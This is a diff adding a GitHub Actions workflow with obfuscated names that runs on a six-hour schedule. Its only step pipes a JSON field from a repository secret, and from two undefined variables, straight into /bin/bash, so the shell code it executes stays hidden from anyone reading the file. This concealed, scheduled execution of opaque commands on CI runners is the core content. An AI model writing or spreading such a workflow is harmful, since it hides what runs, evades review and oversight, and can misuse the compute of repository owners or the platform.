@@ -1,0 +1,19 @@
+name: chixudexiaosheng
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chixudexiaosheng
+        env:
+          fa0357: ${{ secrets.fa0357 }}
+        run: |
+          echo $fa0357 | jq -r .hz8945 | /bin/bash
+          echo $rcduj47000 | jq -r .vk9 | /bin/bash
+          echo $t32 | jq -r .r67 | /bin/bash
+
